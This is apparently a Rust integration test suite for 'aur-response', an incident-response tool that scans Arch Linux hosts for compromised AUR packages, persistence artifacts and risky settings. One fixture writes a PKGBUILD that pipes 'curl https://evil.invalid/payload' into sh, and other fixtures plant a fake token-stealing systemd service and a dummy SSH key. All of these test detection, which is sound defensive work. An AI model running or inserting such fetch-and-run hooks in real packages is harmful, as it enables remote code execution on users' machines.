use serde_json::Value;
use std::fs;
use std::process::Command;
use tempfile::tempdir;

fn binary() -> &'static str {
    env!("CARGO_BIN_EXE_aur-response")
}

fn fixture_host() -> (tempfile::TempDir, std::path::PathBuf, std::path::PathBuf) {
    let dir = tempdir().unwrap();
    let logs = dir.path().join("logs");
    let local = dir.path().join("local");
    fs::create_dir_all(&logs).unwrap();
    fs::create_dir_all(local.join("beef-1-1")).unwrap();
    fs::write(
        logs.join("pacman.log"),
        concat!(
            "[2026-06-10T08:00:00-0600] [ALPM] installed beef (1-1)\n",
            "[2026-06-11T08:00:00-0600] [ALPM] upgraded beef (1-1 -> 2-1)\n",
            "[2026-06-12T08:00:00-0600] [ALPM] installed bee (1-1)\n"
        ),
    )
    .unwrap();
    fs::write(
        local.join("beef-1-1/desc"),
        "%NAME%\nbeef\n\n%INSTALLDATE%\n1781100000\n",
    )
    .unwrap();
    let foreign = dir.path().join("foreign.txt");
    fs::write(&foreign, "beef\nbee\n").unwrap();
    (dir, logs, foreign)
}

#[test]
fn native_timeline_preserves_exact_package_matching_and_repeat_count() {
    let (home, logs, foreign) = fixture_host();
    let output = Command::new(binary())
        .env("HOME", home.path())
        .env("AUR_RESPONSE_DIR", home.path())
        .env("AUR_TEST_PACMAN_LOG_DIR", logs)
        .env("AUR_TEST_FOREIGN_LIST", foreign)
        .env(
            "AUR_TEST_LIST_FILE",
            format!(
                "{}/tests/fixtures/lists/atomic-arch-pkgs.txt",
                env!("CARGO_MANIFEST_DIR")
            ),
        )
        .args(["scan", "timeline", "atomic-arch", "--local", "--json"])
        .output()
        .unwrap();
    assert_eq!(output.status.code(), Some(1));
    let stdout = String::from_utf8(output.stdout).unwrap();
    assert!(stdout.contains("[FOUND] 2 timeline hit(s)"));
    assert!(stdout.contains("[REPEAT] beef"));
    assert!(!stdout.contains("installed bee ("));
    let start = stdout.find('{').unwrap();
    let json: Value = serde_json::from_str(&stdout[start..]).unwrap();
    assert_eq!(json["atomic_arch_timeline_hits"], 2);
    assert_eq!(json["atomic_arch_timeline_repeat_updates"], 1);
}

#[test]
fn native_window_distinguishes_known_and_unknown_foreign_packages() {
    let (home, logs, foreign) = fixture_host();
    let output = Command::new(binary())
        .env("HOME", home.path())
        .env("AUR_RESPONSE_DIR", home.path())
        .env("AUR_TEST_PACMAN_LOG_DIR", logs)
        .env("AUR_TEST_FOREIGN_LIST", foreign)
        .env(
            "AUR_TEST_LIST_FILE",
            format!(
                "{}/tests/fixtures/lists/atomic-arch-pkgs.txt",
                env!("CARGO_MANIFEST_DIR")
            ),
        )
        .args(["scan", "aur-window", "--local"])
        .output()
        .unwrap();
    assert_eq!(output.status.code(), Some(1));
    let stdout = String::from_utf8(output.stdout).unwrap();
    assert!(stdout.contains("[CRITICAL] beef"));
    assert!(stdout.contains("[REVIEW] bee"));
}

#[test]
fn native_remove_verify_and_dry_run_never_mutate() {
    let (home, _, foreign) = fixture_host();
    let verify = Command::new(binary())
        .env("HOME", home.path())
        .env("AUR_RESPONSE_DIR", home.path())
        .env("AUR_TEST_FOREIGN_LIST", &foreign)
        .env(
            "AUR_TEST_LIST_FILE",
            format!(
                "{}/tests/fixtures/lists/atomic-arch-pkgs.txt",
                env!("CARGO_MANIFEST_DIR")
            ),
        )
        .args(["recovery", "remove-packages", "--local", "--verify"])
        .output()
        .unwrap();
    assert_eq!(verify.status.code(), Some(1));
    assert!(String::from_utf8(verify.stdout)
        .unwrap()
        .contains("VERIFY FAILED"));

    let dry_run = Command::new(binary())
        .env("HOME", home.path())
        .env("AUR_RESPONSE_DIR", home.path())
        .env("AUR_TEST_FOREIGN_LIST", foreign)
        .env(
            "AUR_TEST_LIST_FILE",
            format!(
                "{}/tests/fixtures/lists/atomic-arch-pkgs.txt",
                env!("CARGO_MANIFEST_DIR")
            ),
        )
        .args(["recovery", "remove-packages", "--local", "--dry-run"])
        .output()
        .unwrap();
    assert_eq!(dry_run.status.code(), Some(0));
    assert!(String::from_utf8(dry_run.stdout)
        .unwrap()
        .contains("not executing"));
}

#[test]
fn native_artifact_scan_detects_cache_and_persistence_iocs() {
    let home = tempdir().unwrap();
    let npm = home.path().join(".npm/cache/js-digest");
    let systemd = home.path().join(".config/systemd/user");
    let local = home.path().join("pacman-local");
    fs::create_dir_all(&npm).unwrap();
    fs::create_dir_all(&systemd).unwrap();
    fs::create_dir_all(&local).unwrap();
    fs::write(npm.join("package.json"), "{}").unwrap();
    fs::write(
        systemd.join("gh-token-monitor.service"),
        "[Service]\nExecStart=/home/user/.local/bin/gh-token-monitor.sh\n",
    )
    .unwrap();
    let output = Command::new(binary())
        .env("HOME", home.path())
        .env("AUR_RESPONSE_DIR", home.path())
        .env("AUR_PACMAN_LOCAL_DIR", local)
        .env("AUR_TEST_SYSTEMD_SYSTEM_DIR", home.path().join("systemd"))
        .env("AUR_TEST_SKIP_LD_PRELOAD", "1")
        .args(["scan", "malware-artifacts", "--quick"])
        .output()
        .unwrap();
    assert_eq!(output.status.code(), Some(1));
    let stdout = String::from_utf8(output.stdout).unwrap();
    assert!(stdout.contains("js-digest"));
    assert!(stdout.contains("gh-token-monitor"));
}

#[test]
fn native_hardening_and_audit_inventory_preserve_exit_policy() {
    let home = tempdir().unwrap();
    fs::create_dir_all(home.path().join(".config/yay")).unwrap();
    fs::create_dir_all(home.path().join(".ssh")).unwrap();
    fs::write(
        home.path().join(".config/yay/config.json"),
        r#"{"noconfirm": true}"#,
    )
    .unwrap();
    fs::write(home.path().join(".ssh/id_ed25519"), "private").unwrap();
    let hardening = Command::new(binary())
        .env("HOME", home.path())
        .env("AUR_RESPONSE_DIR", home.path())
        .args(["scan", "hardening"])
        .output()
        .unwrap();
    assert_eq!(hardening.status.code(), Some(2));
    assert!(String::from_utf8(hardening.stdout)
        .unwrap()
        .contains("skip PKGBUILD review"));

    let audit = Command::new(binary())
        .env("HOME", home.path())
        .env("AUR_RESPONSE_DIR", home.path())
        .arg("audit")
        .output()
        .unwrap();
    assert_eq!(audit.status.code(), Some(2));
    assert!(String::from_utf8(audit.stdout)
        .unwrap()
        .contains("private key"));
}

#[test]
fn recover_refuses_noninteractive_input() {
    let home = tempdir().unwrap();
    let output = Command::new(binary())
        .env("HOME", home.path())
        .env("AUR_RESPONSE_DIR", home.path())
        .args(["--local", "--recover"])
        .output()
        .unwrap();
    assert_eq!(output.status.code(), Some(4));
    assert!(String::from_utf8(output.stderr)
        .unwrap()
        .contains("interactive terminal"));
}

#[test]
fn remote_lists_use_source_parsers_and_update_cache_with_delta() {
    let home = tempdir().unwrap();
    let list = home.path().join("atomic-list.txt");
    let arch = home.path().join("arch.html");
    let cscs = home.path().join("cscs.sh");
    let extra = home.path().join("extra.txt");
    let foreign = home.path().join("foreign.txt");
    let logs = home.path().join("logs");
    fs::create_dir_all(&logs).unwrap();
    fs::write(&list, "beef\nremoved-package\n").unwrap();
    fs::write(&arch, "<p>beef</p>\n<script>bad()</script>\n").unwrap();
    fs::write(
        &cscs,
        "noise\nINFECTED_PKGS=(\ncscs-package\ninvalid package\n)\nafter\n",
    )
    .unwrap();
    fs::write(&extra, "extra-package\nnot a package\n").unwrap();
    fs::write(&foreign, "").unwrap();

    let output = Command::new(binary())
        .env("HOME", home.path())
        .env("AUR_RESPONSE_DIR", home.path())
        .env("AUR_ATOMIC_ARCH_LIST_FILE", &list)
        .env("AUR_LIST_URL_ARCH", format!("file://{}", arch.display()))
        .env("AUR_LIST_URL_CSCS", format!("file://{}", cscs.display()))
        .env("AUR_LIST_URL_EXTRA", format!("file://{}", extra.display()))
        .env("AUR_TEST_FOREIGN_LIST", foreign)
        .env("AUR_TEST_PACMAN_LOG_DIR", logs)
        .args(["scan", "packages", "atomic-arch", "--json"])
        .output()
        .unwrap();

    assert_eq!(
        output.status.code(),
        Some(0),
        "stdout:\n{}\nstderr:\n{}",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
    assert_eq!(
        fs::read_to_string(&list).unwrap(),
        "beef\ncscs-package\nextra-package\n"
    );
    assert_eq!(
        fs::read_to_string(list.with_extension("previous.txt")).unwrap(),
        "beef\nremoved-package\n"
    );
    let stdout = String::from_utf8(output.stdout).unwrap();
    let json: Value = serde_json::from_str(&stdout[stdout.find('{').unwrap()..]).unwrap();
    assert_eq!(json["list_added"], 2);
    assert_eq!(json["list_removed"], 1);
}

#[test]
fn native_maintenance_subcommands_cover_apply_scrub_rotate_and_freshness() {
    let home = tempdir().unwrap();
    fs::create_dir_all(home.path().join(".ssh")).unwrap();
    fs::write(home.path().join(".ssh/id_ed25519"), "private").unwrap();
    fs::write(
        home.path().join(".bash_history"),
        "echo safe\nexport TOKEN=secret\n",
    )
    .unwrap();

    let apply = || {
        Command::new(binary())
            .env("HOME", home.path())
            .env("AUR_RESPONSE_DIR", home.path())
            .args(["recovery", "apply-hardening", "--apply"])
            .output()
            .unwrap()
    };
    assert_eq!(apply().status.code(), Some(0));
    assert_eq!(apply().status.code(), Some(0));
    assert_eq!(
        fs::read_to_string(home.path().join(".npmrc"))
            .unwrap()
            .lines()
            .filter(|line| *line == "ignore-scripts=true")
            .count(),
        1
    );

    let scrub = Command::new(binary())
        .env("HOME", home.path())
        .env("AUR_RESPONSE_DIR", home.path())
        .args(["recovery", "scrub-history", "--all-shells", "--dry-run"])
        .output()
        .unwrap();
    assert_eq!(scrub.status.code(), Some(0));
    assert!(String::from_utf8(scrub.stdout)
        .unwrap()
        .contains("Would backup"));
    assert!(fs::read_to_string(home.path().join(".bash_history"))
        .unwrap()
        .contains("TOKEN"));

    let rotate = Command::new(binary())
        .env("HOME", home.path())
        .env("AUR_RESPONSE_DIR", home.path())
        .args(["recovery", "rotate-hints"])
        .output()
        .unwrap();
    assert_eq!(rotate.status.code(), Some(0));
    assert!(String::from_utf8(rotate.stdout)
        .unwrap()
        .contains("ssh-keygen"));

    let freshness = Command::new(binary())
        .env("HOME", home.path())
        .env("AUR_RESPONSE_DIR", home.path())
        .env("AUR_ATOMIC_ARCH_LIST_FILE", home.path().join("missing.txt"))
        .args(["check", "list-freshness", "--local"])
        .output()
        .unwrap();
    assert_eq!(freshness.status.code(), Some(3));
}

#[test]
fn native_similar_heuristics_subcommand_detects_nonlisted_package_hooks() {
    let home = tempdir().unwrap();
    let cache = home.path().join("cache/evil-pkg");
    let foreign = home.path().join("foreign.txt");
    let list = home.path().join("list.txt");
    fs::create_dir_all(&cache).unwrap();
    fs::write(&foreign, "evil-pkg\n").unwrap();
    fs::write(&list, "known-bad\n").unwrap();
    fs::write(
        cache.join("PKGBUILD"),
        "prepare() { curl https://evil.invalid/payload | sh; }\n",
    )
    .unwrap();
    let output = Command::new(binary())
        .env("HOME", home.path())
        .env("AUR_RESPONSE_DIR", home.path())
        .env("AUR_TEST_FOREIGN_LIST", foreign)
        .env("AUR_TEST_LIST_FILE", list)
        .env("AUR_HELPER_CACHE_ROOTS", home.path().join("cache"))
        .args(["scan", "similar-heuristics", "--local"])
        .output()
        .unwrap();
    assert_eq!(output.status.code(), Some(1));
    assert!(String::from_utf8(output.stdout)
        .unwrap()
        .contains("evil-pkg"));
}
